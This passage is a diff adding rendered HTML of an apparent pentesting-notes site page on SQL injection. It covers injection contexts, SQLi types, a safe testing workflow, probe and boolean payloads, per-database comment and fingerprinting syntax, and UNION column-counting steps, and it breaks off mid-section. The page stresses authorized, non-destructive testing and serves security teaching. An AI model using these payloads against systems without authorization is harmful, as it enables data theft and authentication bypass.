+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../Networking/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../Cloud/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7" id="__nav_7_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers & Docker
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="sql-injection">SQL Injection</h1>
+<h2 id="introduction">Introduction</h2>
+<p>SQL injection is a vulnerability where user-controlled input becomes part of a database query in an unsafe way.</p>
+<p>If the application builds SQL like this:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="s1">&#39;$username&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<p>and <code>$username</code> is taken directly from a request, an attacker may be able to change the meaning of the query.</p>
+<p>SQLi can lead to:</p>
+<ul>
+<li>
+<p>reading data that should not be visible</p>
+</li>
+<li>
+<p>bypassing authentication or authorization logic</p>
+</li>
+<li>
+<p>modifying or deleting database records</p>
+</li>
+<li>
+<p>discovering database structure</p>
+</li>
+<li>
+<p>in some cases, reading files, writing files, or reaching operating-system level impact</p>
+</li>
+</ul>
+<p>Use these notes only for authorized testing, labs, CTFs, bug bounty scopes, or internal security work.</p>
+<hr />
+<h2 id="useful-resources">Useful Resources</h2>
+<ul>
+<li>
+<p><a href="https://portswigger.net/web-security/sql-injection">PortSwigger SQL Injection</a></p>
+</li>
+<li>
+<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger SQL Injection Cheat Sheet</a></p>
+</li>
+<li>
+<p><a href="https://hacktricks.wiki/en/pentesting-web/sql-injection/index.html">HackTricks SQL Injection</a></p>
+</li>
+<li>
+<p><a href="https://notes.incendium.rocks/pentesting-notes/web/injection/sql-injection">Incendium SQL Injection Notes</a></p>
+</li>
+<li>
+<p><a href="https://davidtancredi.gitbook.io/pentesting-notes/r3dcl1ff/webapp-pentest/sqli">David Tancredi SQLi Notes</a></p>
+</li>
+<li>
+<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP SQL Injection Prevention Cheat Sheet</a></p>
+</li>
+<li>
+<p><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">OWASP WSTG - Testing for SQL Injection</a></p>
+</li>
+<li>
+<p><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/">PayloadsAllTheThings SQL Injection</a></p>
+</li>
+<li>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md">PayloadsAllTheThings NoSQL Injection</a></p>
+</li>
+<li>
+<p><a href="https://github.com/sqlmapproject/sqlmap/wiki/usage">sqlmap Usage Wiki</a></p>
+</li>
+</ul>
+<hr />
+<h2 id="basic-mental-model">Basic Mental Model</h2>
+<p>Most SQLi testing is about answering three questions:</p>
+<ol>
+<li>
+<p><strong>Does my input reach a SQL query?</strong></p>
+</li>
+<li>
+<p><strong>Can I break out of the current SQL context?</strong></p>
+</li>
+<li>
+<p><strong>Can I safely prove impact without damaging data?</strong></p>
+</li>
+</ol>
+<p>A vulnerable query often has this shape:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">USER_INPUT</span><span class="p">;</span>
+</span></code></pre></div>
+<p>or:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="s1">&#39;USER_INPUT&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<p>The exact payload depends on where your input lands:</p>
+<table>
+<thead>
+<tr>
+<th>Context</th>
+<th>Example</th>
+<th>What matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>String value</td>
+<td><code>WHERE name = 'INPUT'</code></td>
+<td>Can you close the quote?</td>
+</tr>
+<tr>
+<td>Numeric value</td>
+<td><code>WHERE id = INPUT</code></td>
+<td>Can you add logic without quotes?</td>
+</tr>
+<tr>
+<td>LIKE pattern</td>
+<td><code>WHERE name LIKE '%INPUT%'</code></td>
+<td>Can you break out of the pattern and string?</td>
+</tr>
+<tr>
+<td>ORDER BY</td>
+<td><code>ORDER BY INPUT</code></td>
+<td>Can you control column number or expression?</td>
+</tr>
+<tr>
+<td>LIMIT/OFFSET</td>
+<td><code>LIMIT INPUT</code></td>
+<td>Usually numeric-only but still worth testing.</td>
+</tr>
+<tr>
+<td>IN clause</td>
+<td><code>WHERE id IN (INPUT)</code></td>
+<td>Can you close the list or inject another value?</td>
+</tr>
+<tr>
+<td>JSON body</td>
+<td><code>{ "id": "INPUT" }</code></td>
+<td>Same SQL risks, different transport format.</td>
+</tr>
+<tr>
+<td>Cookie/header</td>
+<td><code>Cookie: tracking=INPUT</code></td>
+<td>Often used in analytics queries and blind SQLi.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="main-sqli-types">Main SQLi Types</h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Meaning</th>
+<th>Typical signal</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>In-band SQLi</td>
+<td>Results come back in the same HTTP response.</td>
+<td>Data or errors appear on the page.</td>
+</tr>
+<tr>
+<td>UNION-based SQLi</td>
+<td>Uses <code>UNION SELECT</code> to append attacker-controlled rows to the original result.</td>
+<td>Injected values appear in the response.</td>
+</tr>
+<tr>
+<td>Error-based SQLi</td>
+<td>Database errors reveal query behavior or data.</td>
+<td>SQL syntax errors, type conversion errors, verbose stack traces.</td>
+</tr>
+<tr>
+<td>Boolean-based blind SQLi</td>
+<td>Response changes based on true/false conditions.</td>
+<td>Different page content, status code, redirect, JSON field, or length.</td>
+</tr>
+<tr>
+<td>Time-based blind SQLi</td>
+<td>Response time changes based on a condition.</td>
+<td>Delayed response when condition is true.</td>
+</tr>
+<tr>
+<td>Out-of-band SQLi</td>
+<td>Database triggers DNS/HTTP interaction to an external listener.</td>
+<td>Collaborator/OAST callback.</td>
+</tr>
+<tr>
+<td>Second-order SQLi</td>
+<td>Payload is stored first, then executed later in another function.</td>
+<td>Trigger happens in profile views, exports, admin panels, jobs.</td>
+</tr>
+<tr>
+<td>Stacked queries</td>
+<td>Multiple SQL statements are sent in one injection.</td>
+<td>Depends heavily on DBMS and driver support.</td>
+</tr>
+<tr>
+<td>ORM/HQL injection</td>
+<td>Unsafe dynamic query construction in an ORM query language.</td>
+<td>Similar behavior to SQLi, but syntax may differ.</td>
+</tr>
+<tr>
+<td>NoSQL injection</td>
+<td>Injection into non-SQL database queries, such as MongoDB operators.</td>
+<td>Auth bypass, altered filters, unexpected query matches.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="where-to-test">Where to Test</h2>
+<p>Test every place where user-controlled input can reach backend logic.</p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>URL query parameters</td>
+<td><code>?id=1</code>, <code>?search=test</code>, <code>?sort=name</code></td>
+</tr>
+<tr>
+<td>URL path parameters</td>
+<td><code>/users/123</code>, <code>/product/1</code></td>
+</tr>
+<tr>
+<td>POST form fields</td>
+<td>login, search, profile, checkout</td>
+</tr>
+<tr>
+<td>JSON body fields</td>
+<td>API filters, GraphQL variables, REST payloads</td>
+</tr>
+<tr>
+<td>Cookies</td>
+<td>tracking IDs, session-adjacent analytics cookies</td>
+</tr>
+<tr>
+<td>Headers</td>
+<td><code>User-Agent</code>, <code>Referer</code>, <code>X-Forwarded-For</code>, custom headers</td>
+</tr>
+<tr>
+<td>Multipart fields</td>
+<td>upload metadata, filenames, descriptions</td>
+</tr>
+<tr>
+<td>Import files</td>
+<td>CSV, XML, JSON, Excel imports</td>
+</tr>
+<tr>
+<td>Stored profile fields</td>
+<td>username, display name, address, bio</td>
+</tr>
+<tr>
+<td>Admin-only views</td>
+<td>support tickets, CRM entries, logs, audit panels</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="safe-testing-workflow">Safe Testing Workflow</h2>
+<ol>
+<li>
+<p><strong>Confirm scope and authorization.</strong></p>
+</li>
+<li>
+<p><strong>Capture a baseline request and response.</strong></p>
+</li>
+<li>
+<p><strong>Change only one parameter at a time.</strong></p>
+</li>
+<li>
+<p><strong>Use a unique marker first</strong>, for example <code>sqli_probe_73921</code>.</p>
+</li>
+<li>
+<p><strong>Try syntax probes</strong>, such as a single quote, double quote, or backtick.</p>
+</li>
+<li>
+<p><strong>Compare responses</strong> by status code, length, visible text, timing, and redirects.</p>
+</li>
+<li>
+<p><strong>Test boolean differences</strong> with true and false conditions.</p>
+</li>
+<li>
+<p><strong>If blind, test controlled time delays.</strong></p>
+</li>
+<li>
+<p><strong>Avoid destructive payloads</strong>, especially on production systems.</p>
+</li>
+<li>
+<p><strong>Prove impact with minimal data</strong>, not full database dumps.</p>
+</li>
+</ol>
+<hr />
+<h2 id="first-probe-payloads">First Probe Payloads</h2>
+<p>Start with simple probes that are unlikely to modify data.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>&#39;
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>&quot;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>`
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>&#39;)
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>&quot;)
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>`)
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>&#39;))
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>&quot;))
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>`))
+</span></code></pre></div>
+<p>Look for:</p>
+<ul>
+<li>
+<p>SQL syntax errors</p>
+</li>
+<li>
+<p>different HTTP status codes</p>
+</li>
+<li>
+<p>different response lengths</p>
+</li>
+<li>
+<p>changed page content</p>
+</li>
+<li>
+<p>changed JSON values</p>
+</li>
+<li>
+<p>redirects</p>
+</li>
+<li>
+<p>delayed responses</p>
+</li>
+<li>
+<p>blocked/WAF responses</p>
+</li>
+</ul>
+<h3 id="important-warning-about-or-11">Important warning about <code>OR 1=1</code></h3>
+<p>Be careful with payloads such as:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">OR</span><span class="w">  </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
+</span></code></pre></div>
+<p>They can look harmless during testing, but the same input may be reused in an <code>UPDATE</code>, <code>DELETE</code>, reporting job, or background process.</p>
+<p>Use paired true/false tests instead where possible:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">2</span>
+</span></code></pre></div>
+<p>or for numeric contexts:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="mi">1</span><span class="w">  </span><span class="k">AND</span><span class="w">  </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="mi">1</span><span class="w">  </span><span class="k">AND</span><span class="w">  </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span>
+</span></code></pre></div>
+<hr />
+<h2 id="boolean-based-confirmation">Boolean-Based Confirmation</h2>
+<p>Boolean testing checks whether the application behaves differently when the injected condition is true or false.</p>
+<table>
+<thead>
+<tr>
+<th>Context</th>
+<th>True test</th>
+<th>False test</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>String</td>
+<td><code>' AND '1'='1</code></td>
+<td><code>' AND '1'='2</code></td>
+</tr>
+<tr>
+<td>Numeric</td>
+<td><code>1 AND 1=1</code></td>
+<td><code>1 AND 1=2</code></td>
+</tr>
+<tr>
+<td>Commented string</td>
+<td><code>' AND '1'='1' --</code></td>
+<td><code>' AND '1'='2' --</code></td>
+</tr>
+<tr>
+<td>Parenthesized</td>
+<td><code>') AND ('1'='1</code></td>
+<td><code>') AND ('1'='2</code></td>
+</tr>
+</tbody>
+</table>
+<p>Possible confirmation signals:</p>
+<ul>
+<li>
+<p>product/listing appears vs disappears</p>
+</li>
+<li>
+<p>login succeeds vs fails</p>
+</li>
+<li>
+<p>JSON says <code>true</code> vs <code>false</code></p>
+</li>
+<li>
+<p>response length changes consistently</p>
+</li>
+<li>
+<p>different error message</p>
+</li>
+<li>
+<p>different redirect path</p>
+</li>
+</ul>
+<hr />
+<h2 id="comments-by-database">Comments by Database</h2>
+<p>Comments are used to ignore the rest of the original query after injection.</p>
+<table>
+<thead>
+<tr>
+<th>Database</th>
+<th>Comment syntax</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td><code>--</code>, <code>#</code>, <code>/* comment */</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>--</code>, <code>/* comment */</code></td>
+</tr>
+<tr>
+<td>Microsoft SQL Server</td>
+<td><code>--</code>, <code>/* comment */</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>--</code></td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>--</code>, <code>/* comment */</code></td>
+</tr>
+</tbody>
+</table>
+<p>For MySQL, <code>--</code> normally needs a space after it:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1">--</span>
+</span></code></pre></div>
+<p>A common end-of-query marker is:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1">-- -</span>
+</span></code></pre></div>
+<hr />
+<h2 id="sql-contexts-and-example-thinking">SQL Contexts and Example Thinking</h2>
+<h3 id="string-context">String Context</h3>
+<p>Original query:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="s1">&#39;INPUT&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<p>Probe:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="err">&#39;</span>
+</span></code></pre></div>
+<p>Possible safe confirmation:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">2</span>
+</span></code></pre></div>
+<h3 id="numeric-context">Numeric Context</h3>
+<p>Original query:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">INPUT</span><span class="p">;</span>
+</span></code></pre></div>
+<p>Probe:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="mi">1</span><span class="err">&#39;</span>
+</span></code></pre></div>
+<p>Possible safe confirmation:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="mi">1</span><span class="w">  </span><span class="k">AND</span><span class="w">  </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="mi">1</span><span class="w">  </span><span class="k">AND</span><span class="w">  </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span>
+</span></code></pre></div>
+<h3 id="order-by-context">ORDER BY Context</h3>
+<p>Original query:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="k">INPUT</span><span class="p">;</span>
+</span></code></pre></div>
+<p>Useful tests:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="mi">1</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="mi">2</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="mi">3</span>
+</span></code></pre></div>
+<p>If column indexes work, the response may reorder or error when the index is invalid.</p>
+<h3 id="like-context">LIKE Context</h3>
+<p>Original query:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w">  </span><span class="n">name</span><span class="w">  </span><span class="k">LIKE</span><span class="w">  </span><span class="s1">&#39;%INPUT%&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<p>You may need to escape both the string and wildcard pattern context.</p>
+<hr />
+<h2 id="database-fingerprinting">Database Fingerprinting</h2>
+<p>Different databases have different functions and syntax.</p>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>MySQL</th>
+<th>PostgreSQL</th>
+<th>Microsoft SQL Server</th>
+<th>Oracle</th>
+<th>SQLite</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Version</td>
+<td><code>SELECT @@version</code></td>
+<td><code>SELECT version()</code></td>
+<td><code>SELECT @@version</code></td>
+<td><code>SELECT banner FROM v$version</code></td>
+<td><code>SELECT sqlite_version()</code></td>
+</tr>
+<tr>
+<td>Current database</td>
+<td><code>SELECT database()</code></td>
+<td><code>SELECT current_database()</code></td>
+<td><code>SELECT DB_NAME()</code></td>
+<td><code>SELECT ora_database_name FROM dual</code></td>
+<td><code>PRAGMA database_list</code></td>
+</tr>
+<tr>
+<td>Current user</td>
+<td><code>SELECT user()</code></td>
+<td><code>SELECT current_user</code></td>
+<td><code>SELECT SYSTEM_USER</code></td>
+<td><code>SELECT user FROM dual</code></td>
+<td>N/A</td>
+</tr>
+<tr>
+<td>String concat</td>
+<td><code>CONCAT('a','b')</code> or <code>'a' 'b'</code></td>
+<td><code>'a'||'b'</code></td>
+<td><code>'a'+'b'</code></td>
+<td><code>'a'||'b'</code></td>
+<td><code>'a'||'b'</code></td>
+</tr>
+<tr>
+<td>Sleep</td>
+<td><code>SLEEP(5)</code></td>
+<td><code>pg_sleep(5)</code></td>
+<td><code>WAITFOR DELAY '0:0:5'</code></td>
+<td><code>DBMS_LOCK.SLEEP(5)</code></td>
+<td>Usually no built-in sleep</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="union-based-sqli">UNION-Based SQLi</h2>
+<p>UNION-based SQLi is useful when the application returns query results in the HTTP response.</p>
+<p>The <code>UNION</code> operator appends the result of another <code>SELECT</code> query to the original query.</p>
+<h3 id="union-requirements">UNION Requirements</h3>
+<p>For <code>UNION SELECT</code> to work:</p>
+<ol>
+<li>
+<p>The number of selected columns must match.</p>
+</li>
+<li>
+<p>The data types must be compatible.</p>
+</li>
+<li>
+<p>At least one returned column must be visible in the response.</p>
+</li>
+</ol>
+<h3 id="find-the-number-of-columns">Find the Number of Columns</h3>
+<p>Method 1: <code>ORDER BY</code></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w">  </span><span class="mi">1</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w">  </span><span class="mi">2</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w">  </span><span class="mi">3</span>
+</span></code></pre></div>
+<p>When the number is too high, the database may return an error.</p>
+<p>Method 2: <code>UNION SELECT NULL</code></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="k">UNION</span><span class="w">  </span><span class="k">SELECT</span><span class="w">  </span><span class="k">NULL</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="k">UNION</span><span class="w">  </span><span class="k">SELECT</span><span class="w">  </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="k">UNION</span><span class="w">  </span><span class="k">SELECT</span><span class="w">  </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span>
+</span></code></pre></div>
+<h3 id="find-a-visible-text-column">Find a Visible Text Column</h3>
+<p>Use marker values:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="k">UNION</span><span class="w">  </span><span class="k">SELECT</span><span class="w">  </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;sqli_probe_73921&#39;</span><span class="p">,</span><span class="k">NULL</span>
+</span></code></pre></div>
+<p>If <code>sqli_probe_73921</code> appears in the response, that column is reflected.</p>
+<h3 id="minimal-data-proof">Minimal Data Proof</h3>
+<p>Use minimal, non-sensitive proof first:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="k">UNION</span><span class="w">  </span><span class="k">SELECT</span><span class="w">  </span><span class="k">NULL</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="k">NULL</span>
+</span></code></pre></div>
+<p>or:</p>
